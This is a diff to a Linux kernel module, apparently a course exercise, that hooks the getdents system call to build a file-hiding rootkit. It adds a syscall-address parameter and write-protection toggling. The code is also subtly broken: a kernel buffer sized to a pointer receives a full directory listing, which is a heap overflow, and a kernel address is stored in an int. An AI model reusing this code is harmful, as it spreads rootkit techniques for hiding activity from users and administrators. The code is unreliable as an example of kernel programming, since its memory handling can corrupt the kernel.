@@ -44,7 +44,9 @@ static int root_uid;
 module_param(root_uid, int, 0);
 MODULE_PARM_DESC(root_uid, "Root UID");
 
-
+static int getdents_addr;
+module_param(getdents_addr, int, 0);
+MODULE_PARM_DESC(getdents_addr, "Address of sys_getdents in memory");
 //******
 //TODO: NEEDED FOR PART C
 //  Accept magic_prefix as a kernel module parameter
@@ -73,6 +75,7 @@ asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp, unsigned int co
   printk(KERN_INFO "Count: %d\n", nread);
 
   if (nread != 0) {
+    set_addr_rw(getdents_addr);
     int bpos = 0;
     linux_dirent *new_dirp = kmalloc(sizeof(dirp), GFP_KERNEL);
     copy_from_user(new_dirp, dirp, nread);
@@ -82,6 +85,7 @@ asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp, unsigned int co
       printk(KERN_INFO "entry: %s\n", d->d_name);
       bpos += (int)d->d_reclen;
     }
+    set_addr_ro(getdents_addr);
   }
   //Invoke the original syscall
   return nread;
